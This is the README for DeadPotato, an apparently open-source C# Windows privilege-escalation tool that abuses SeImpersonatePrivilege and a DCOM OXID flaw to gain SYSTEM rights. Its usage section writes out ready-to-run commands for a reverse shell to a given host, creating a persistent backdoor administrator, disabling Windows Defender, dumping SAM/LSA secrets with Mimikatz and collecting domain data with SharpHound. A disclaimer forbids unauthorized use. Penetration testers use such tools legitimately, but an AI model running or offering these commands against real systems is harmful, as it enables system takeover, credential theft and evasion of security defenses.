<p align="center">
  <banner><image href="title-banner" src="https://github.com/user-attachments/assets/460525cb-1871-4608-a6e5-1c5da07f63aa" /></image></banner><br>
  <a href="#"><img alt="forksBDG" src="https://img.shields.io/github/forks/lypd0/DeadPotato?style=for-the-badge"></a>
  <a href="#"><img alt="starsBDG" src="https://img.shields.io/github/stars/lypd0/DeadPotato?style=for-the-badge"></a>
  <a href="#"><img alt="licenseBDG" src="https://img.shields.io/github/license/lypd0/DeadPotato?style=for-the-badge"></a>
  <a href="#"><img alt="languageBDG" src="https://img.shields.io/badge/LANGUAGE-CSHARP-green?style=for-the-badge"></a>

************************************************************

<h3 align="center">🚨 Hashdump & SharpHound Modules Now Available! 🚨</h3>
<h4 align="center"><i>❗ Usage of this program under an unauthorized context is strictly forbidden. The author(s) of DeadPotato do not take any responsibility for any harm caused to systems. Use with caution. ❗</i></h4>

************************************************************

```

C:\Users\lypd0> GodPotato.exe
  
    ⠀⢀⣠⣤⣤⣄⡀⠀    _           _
    ⣴⣿⣿⣿⣿⣿⣿⣦   | \ _  _  _||_) _ _|_ _ _|_ _
    ⣿⣿⣿⣿⣿⣿⣿⣿   |_/(/_(_|(_||  (_) |_(_| |_(_)
    ⣇⠈⠉⡿⢿⠉⠁⢸   Open Source @ github.com/lypd0
    ⠙⠛⢻⣷⣾⡟⠛⠋         -= Version: 1.2 =-
        ⠈⠁⠀⠀⠀

_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

 (*) Example Usage(s):

   -={ deadpotato.exe -MODULE [ARGUMENTS] }=-

   -> deadpotato.exe -cmd "whoami"
   -> deadpotato.exe -rev 192.168.10.30:9001
   -> deadpotato.exe -exe paylod.exe
   -> deadpotato.exe -newadmin lypd0:DeadPotatoRocks1
   -> deadpotato.exe -shell
   -> deadpotato.exe -mimi sam
   -> deadpotato.exe -defender off
   -> deadpotato.exe -sharphound

 (*) Available Modules:

   - cmd: Execute a command as NT AUTHORITY\SYSTEM.
   - rev: Attempts to establish a reverse shell connection to the provided host
   - exe: Execute a program with NT AUTHORITY\SYSTEM privileges (Does not support interactivity).
   - newadmin: Create a new administrator user on the local system.
   - shell: Manages to achieve a semi-interactive shell (NOTE: Very bad OpSec!)
   - mimi: Attempts to dump SAM/LSA/SECRETS with Mimikatz. (NOTE: This will write mimikatz to disk!)
   - defender: Either enables or disables Windows Defender's real-time protection.
   - sharphound: Attempts to collect domain data for BloodHound.

```

************************************************************

<h2 align="center"> ❔ Quick Start - How To Use  ❔ </h2>
<p><i><strong>The `SeImpersonatePrivilege` right is enabled in your context? With <i><strong>DeadPotato</strong></i>, it is possible to achieve maximum privileges on the local system.<br><br>
The tool will attempt to start an elevated process running in the context of the `NT AUTHORITY\SYSTEM` user by abusing the DCOM's RPCSS flaw in handling OXIDs, allowing unrestricted access over the machine for critical operations to be freely performed.<br><br>
⚠️ In the following case, the `-cmd` module is used. Many modules are available for use, such as the `-rev IP:PORT` for spawning an elevated reverse shell, `-newadmin usr:pass` for creating a new local Administrator user for persistence, or `-mimi sam` for dumping SAM hashes.</strong></i></p></br>

************************************************************
<image align=*center*> 
<a href="GQJhLcT9IHA" src=*https://github.com/user-attachments/assets/b5f71f4a-f8bc-4099-81c5-54bcece7abb6* /></a>
<h3 align="center"> Verify SeImpersonatePrivilege rights </h3>
<p><i>In order to use DeadPotato, the SeImpersonatePrivilege right must be enabled in the current context. In order to verify this, the `whoami /priv` command can be executed.</br>
<p align="center"> If there privilege is disabled, exploitation is not possible in the current context.</i></p></br>

************************************************************

```
   C:\Users\lypd0> whoami /priv

    <...SNIP...>
    SeImpersonatePrivilege    Impersonate a client after authentication     Enabled
    <...SNIP...>

```
</br>

************************************************************

<h2 align="center">🐚 Getting an Elevated Reverse Shell </h2>

![cmd_XQASCL7Lz6](https://github.com/user-attachments/assets/201fa7cb-4253-47e4-8beb-1ae781fc481c)

************************************************************

<h3 align="center"> 🏅 Credits </h3>
<p align="center"><i>This Project "DeadPotato" is a tool built on the source code of the masterpiece "GodPotato" by BeichenDream.</br>
If you like this project, make sure to also go show support to [the original project : </br> 
https://github.com/BeichenDream/GodPotato</i></br>
<p align="center"> 
<strong>
 💥 BeichenDream, </br>
 💥 Benjamin DELPY `gentilkiwi`, </br>
 💥 BloodHound Developers. </br></strong>
</p>

************************************************************

<h4 align="center"> License </h4>
<h5 align="center">
 This project is licensed under the Apache 2.0 License : </br></br>          
 https://choosealicense.com/licenses/apache-2.0 </br></br> 
 Please review the LICENSE file for more details. </br></h5>
   
************************************************************

<h4 align="center">
<image href="Star History Chart" src="https://api.star-history.com/svg?repos=lypd0/DeadPotato&type=Date" /image></h4>

************************************************************
